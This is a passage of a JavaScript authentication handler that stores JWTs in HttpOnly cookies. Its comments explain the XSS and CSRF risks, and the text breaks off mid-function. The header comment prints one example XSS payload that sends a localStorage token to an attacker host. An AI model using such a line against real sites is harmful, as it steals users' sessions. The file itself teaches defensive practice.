```javascript
/**
 * Authentication Handler
 *
 * SECURITY NOTE — Why we do NOT store JWTs in localStorage or sessionStorage:
 *
 * Both localStorage and sessionStorage are accessible via JavaScript running
 * in the browser (e.g., `localStorage.getItem('token')`). This means that
 * any Cross-Site Scripting (XSS) attack — where malicious scripts are injected
 * into your page via user-generated content, third-party scripts, browser
 * extensions, or compromised CDN assets — can trivially read and exfiltrate
 * the token to an attacker-controlled server.
 *
 * Example of what a malicious injected script could do:
 *   fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
 *
 * This would silently steal the user's session with zero indication to the user.
 *
 * THE SECURE ALTERNATIVE — HttpOnly Cookies:
 *
 * When the server sets the JWT inside an HttpOnly cookie, JavaScript running
 * in the browser CANNOT read it (document.cookie will not expose it). The
 * cookie is automatically attached to every qualifying same-origin request
 * by the browser itself. An XSS payload cannot exfiltrate what it cannot read.
 *
 * Recommended server-side cookie flags:
 *   - HttpOnly   → Prevents JavaScript access entirely.
 *   - Secure     → Cookie is only sent over HTTPS connections.
 *   - SameSite=Strict or Lax → Mitigates CSRF attacks by restricting
 *                              cross-origin cookie sending.
 *   - Path=/     → Scope the cookie to the whole application.
 *   - Max-Age / Expires → Set an appropriate expiration window.
 *
 * Example server response header (Node/Express):
 *   res.cookie('jwt', token, {
 *     httpOnly: true,
 *     secure: true,
 *     sameSite: 'Strict',
 *     maxAge: 15 * 60 * 1000 // 15 minutes
 *   });
 *
 * CSRF MITIGATION:
 * Because we rely on cookies, we must also defend against Cross-Site Request
 * Forgery (CSRF). Common approaches:
 *   1. SameSite=Strict/Lax cookie flag (primary defense for modern browsers).
 *   2. A separate CSRF token stored in a non-HttpOnly cookie or a meta tag,
 *      sent back as a custom request header (which cross-origin requests
 *      cannot set without CORS pre-flight approval).
 */

const AUTH_ENDPOINT = '/api/auth';

/**
 * Logs the user in by sending credentials to the server.
 * The server responds by setting an HttpOnly cookie containing the JWT.
 * We never touch or store the token ourselves.
 *
 * @param {string} username
 * @param {string} password
 * @returns {Promise<{ success: boolean, user?: object, error?: string }>}
 */
async function login(username, password) {
  // Basic input sanitisation before sending to the server.
  if (!username || typeof username !== 'string' || username.trim() === '') {
    return { success: false, error: 'Username is required.' };
  }
  if (!password || typeof password !== 'string' || password.length === 0) {
    return { success: false, error: 'Password is required.' };
  }

  try {
    const response = await fetch(`${AUTH_ENDPOINT}/login`, {
      method: 'POST',

      headers: {
        'Content-Type': 'application/json',

        // If your server issues a CSRF token in a non-HttpOnly cookie or a
        // <meta> tag, read it here and include it as a custom header.
        // Cross-origin attackers cannot set custom headers, so this is a
        // valid CSRF mitigation complementing SameSite cookies.
        // 'X-CSRF-Token': getCsrfTokenFromMeta(),
      },

      body: JSON.stringify({
        username: username.trim(),
        password,           // Never log passwords; send only over HTTPS.
      }),

      // 'include' ensures cookies are sent WITH the request AND that
      // Set-Cookie headers in the response are accepted and stored by
      // the browser — even on cross-origin requests if the server allows it.
      // For same-origin APIs use 'same-origin' (slightly more restrictive).
      credentials: 'same-origin',
    });

    if (!response.ok) {
      // Avoid leaking detailed server errors to the UI.
      const errorData = await response.json().catch(() => ({}));
      return {
        success: false,
        error: errorData.message || `Login failed (${response.status}).`,
      };
    }

    // The JWT now lives exclusively inside the HttpOnly cookie set by the
    // server. We receive only public, non-sensitive user data in the body.
    const data = await response.json();

    return {
      success: true,
      user: data.user, // e.g. { id, username, role } — NO token here.
    };

  } catch (networkError) {
    console.error('Login network error:', networkError);
    return { success: false, error: 'A network error occurred. Please try again.' };
  }
}

/**
 * Makes an authenticated API request.
 * The browser automatically attaches the HttpOnly JWT cookie — no manual
 * token retrieval or Authorization header construction required.
 *
 * @param {string} url      - API endpoint path.
 * @param {RequestInit} [options] - Optional fetch options to merge.
 * @returns {Promise<Response>}
 */
async function authenticatedFetch(url, options = {}) {
  const defaultOptions = {
    credentials: 'same-origin', // Attach the HttpOnly cookie automatically.
    headers: {
      'Content-Type': 'application/json',
      // Include CSRF header here too if your server requires it.
      // 'X-CSRF-Token': getCsrfTokenFromMeta(),
      ...options.headers,
    },
  };

  const mergedOptions = { ...defaultOptions, ...options };
  const response = await fetch(url, mergedOptions);

  // Handle 401 (token expired / invalid) centrally.
  if (response.status === 401) {
    // Optionally attempt a silent token refresh before giving up.
    const refreshed = await refreshAccessToken();
    if (refreshed) {
      // Retry the original request once after a successful refresh.
      return fetch(url, mergedOptions);
    }

    // Refresh failed — redirect to login.
    redirectToLogin();
  }

  return response;
}

/**
 * Attempts to silently refresh the access token using a long-lived refresh
 * token (also stored in an HttpOnly cookie by the server).
 *
 * @returns {Promise<boolean>} Whether the refresh succeeded.
 */
async function refreshAccessToken() {
  try {
    const response = await fetch(`${AUTH_ENDPOINT}/refresh`, {
      method: 'POST',
      credentials: 'same-origin',
      // The refresh-token HttpOnly cookie is attached automatically.
    });

    return response.ok;
  } catch {
    return false;
  }
}

/**
 * Logs the user out by asking the server to clear the HttpOnly cookie.
 * We cannot clear an HttpOnly cookie from JavaScript — only the server can.
 *
 * @returns {Promise<void>}
 */
async function logout() {
  try {
    await fetch(`${AUTH_ENDPOINT}/logout`, {
      method: 'POST',
      credentials: 'same-origin',
      // Server will respond with: Set-Cookie: jwt=; Max-Age=0; HttpOnly; ...
    });
  } catch (err) {
    console.error('Logout request failed:', err);
  } finally {
    // Clear any non-sensitive in-memory state and redirect.
    redirectToLogin();
  }
}

/**
 * Helper: reads a CSRF token embedded in a <meta> tag by the server.
 * e.g. <meta name="csrf-token" content="abc123">
 *
 * @returns {string}
 */
function getC